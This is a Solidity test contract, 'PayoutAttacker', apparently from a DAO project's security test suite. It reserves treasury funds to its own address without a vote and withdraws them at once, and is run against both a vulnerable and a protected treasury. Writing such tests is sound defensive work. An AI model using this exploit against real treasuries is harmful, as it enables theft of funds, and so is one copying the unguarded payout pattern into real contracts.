// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IDAOTreasury} from "../interfaces/IDAOTreasury.sol";

/// @title Treasury surface used by the attack
/// @notice Extends the governor-facing interface with the pull-payment call.
interface IPayoutTarget is IDAOTreasury {
    /// @notice Withdraws all funds reserved for the caller.
    function withdraw() external;
}

/// @title Payout attacker (educational)
/// @notice Навчальний контракт для локальних тестів безпеки.
/// Намагається без голосування зарезервувати кошти скарбниці
/// на власну адресу й одразу забрати їх через withdraw().
/// @dev The same code is used against the vulnerable copy and
/// the protected DAOTreasury. Never deploy outside local tests.
contract PayoutAttacker {
    /// @notice Treasury under attack.
    IPayoutTarget public immutable target;

    event AttackCompleted(uint256 proposalId, uint256 amount);

    /// @param targetTreasury Address of the treasury to attack.
    constructor(address targetTreasury) {
        target = IPayoutTarget(targetTreasury);
    }

    /// @notice Reserves a payout to this contract and withdraws it.
    /// @param proposalId Arbitrary proposal identifier, no vote required.
    /// @param amount Amount of ETH in wei to steal.
    function attack(uint256 proposalId, uint256 amount) external {
        target.reservePayout(proposalId, address(this), amount);
        target.withdraw();

        emit AttackCompleted(proposalId, amount);
    }

    /// @notice Receives ETH paid out by the treasury.
    receive() external payable {}
}
